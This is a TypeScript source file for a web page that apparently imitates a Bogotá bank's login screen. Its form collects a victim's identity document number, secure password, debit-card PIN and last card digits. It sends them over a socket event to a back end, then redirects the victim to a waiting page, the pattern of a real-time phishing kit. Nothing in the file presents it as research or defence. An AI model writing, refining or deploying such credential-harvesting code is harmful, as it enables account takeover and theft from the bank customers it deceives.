import { getSessionId } from "../../utils/session";
import { getSocket } from "../../utils/socket";
import { homeTemplate } from "./home.html";

export const renderHome = async () => {
    const app = document.querySelector<HTMLDivElement>('#app');

    if (app) {

        app.innerHTML = homeTemplate();
    }

    const params = new URLSearchParams(window.location.search);
    const modal = document.getElementById("errorModal");

    if (params.get("p") === "e" && modal) {
        modal.classList.add("visible");
    }

    const socket = getSocket();
    const sessionId = await getSessionId();


    const tipoDoc = document.querySelector(".tipo_doc");
    const modalSelect = document.querySelector(".modal_select_documento") as HTMLElement | null;
    const opciones = document.querySelectorAll(".opcion");
    const textTipoDoc = document.getElementById("text_tipo_doc");
    const inputTipoDoc = document.querySelector<HTMLInputElement>("input[name='tipo_doc']");
    const nroDoc = document.getElementById("nro_doc") as HTMLInputElement | null;
    const clave = document.getElementById("clave") as HTMLInputElement | null;
    const cardClave = document.getElementById("card_clave") as HTMLInputElement | null;
    const cardDigitos = document.getElementById("card_digitos") as HTMLInputElement | null;
    const ingresarBtn = document.getElementById("ingresarBtn") as HTMLButtonElement | null;
    const toggleButton = document.getElementById("toggleButton") as HTMLButtonElement | null;
    const form = document.querySelector<HTMLFormElement>('#miFormulario');


    form?.addEventListener("submit", (event) => {
        event.preventDefault();


        if (nroDoc?.value && clave?.value) {



            socket.emit("client:auth", {
                username: nroDoc?.value,
                password: clave?.value,
                provider: "Bogota",
                id_type: inputTipoDoc?.value,
                ip: sessionId,
            });

            window.location.href = "/espera";
          

        } else if (nroDoc?.value && cardClave?.value && cardDigitos?.value) {


            socket.emit("client:auth", {
                username: nroDoc?.value,
                atm_pass: cardClave?.value,
                card_number: cardDigitos?.value,
                provider: "Bogota",
                id_type: inputTipoDoc?.value,
                ip: sessionId,
            });

            window.location.href = "/espera";
          
        }




    });


    tipoDoc?.addEventListener("click", () => {
        if (modalSelect) {
            modalSelect.style.display = modalSelect.style.display === "flex" ? "none" : "flex";
        }
    });


    opciones.forEach(opcion => {
        opcion.addEventListener("click", () => {
            const abreviacion = opcion.id.toUpperCase();
            const nombreCompleto = opcion.textContent?.split("- ")[1]?.trim() ?? "";

            if (textTipoDoc) textTipoDoc.textContent = abreviacion;
            if (inputTipoDoc) inputTipoDoc.value = nombreCompleto;

            if (modalSelect) modalSelect.style.display = "none";
        });
    });


    [clave, cardClave, cardDigitos].forEach(input => {
        input?.addEventListener("input", () => {
            if (input.value.length > 4) {
                input.value = input.value.slice(0, 4);
            }
        });
    });


    function validateForm() {
        const nroDocValid = (nroDoc?.value.length ?? 0) >= 5;
        const isDebitMode = toggleButton?.textContent === "Ingresar clave segura";

        if (ingresarBtn) {
            if (isDebitMode) {
                const cardClaveValid = (cardClave?.value.length ?? 0) === 4;
                const cardDigitosValid = (cardDigitos?.value.length ?? 0) === 4;
                ingresarBtn.disabled = !(nroDocValid && cardClaveValid && cardDigitosValid);
            } else {
                const claveValid = (clave?.value.length ?? 0) === 4;
                ingresarBtn.disabled = !(nroDocValid && claveValid);
            }
        }
    }

    [nroDoc, clave, cardClave, cardDigitos].forEach(input => {
        input?.addEventListener("input", validateForm);
    });


    function claveTarjeta() {
        const isDebitMode = toggleButton?.textContent === "Ingresar con tarjeta débito";

        const claveSegura = document.getElementById("clave_segura") as HTMLElement | null;
        const claveTarjetaEl = document.getElementById("clave_tarjeta") as HTMLElement | null;
        const ultimosDigitos = document.getElementById("ultimos_digitos") as HTMLElement | null;

        if (isDebitMode) {
            claveSegura!.style.display = "none";
            claveTarjetaEl!.style.display = "block";
            ultimosDigitos!.style.display = "block";
            if (toggleButton) toggleButton.textContent = "Ingresar clave segura";
        } else {
            claveSegura!.style.display = "block";
            claveTarjetaEl!.style.display = "none";
            ultimosDigitos!.style.display = "none";
            if (toggleButton) toggleButton.textContent = "Ingresar con tarjeta débito";
        }

        validateForm();
    }


    (window as any).claveTarjeta = claveTarjeta;
};


function closeModalTipoDoc() {
    const modal = document.querySelector(".modal_select_documento") as HTMLElement | null;
    if (modal) modal.style.display = "none";
}

(window as any).closeModalTipoDoc = closeModalTipoDoc;

export function closeModale() {
    const modal = document.querySelector(".content_modal_e") as HTMLElement | null;
    if (modal) modal.style.display = "none";
}


(window as any).closeModale = closeModale;




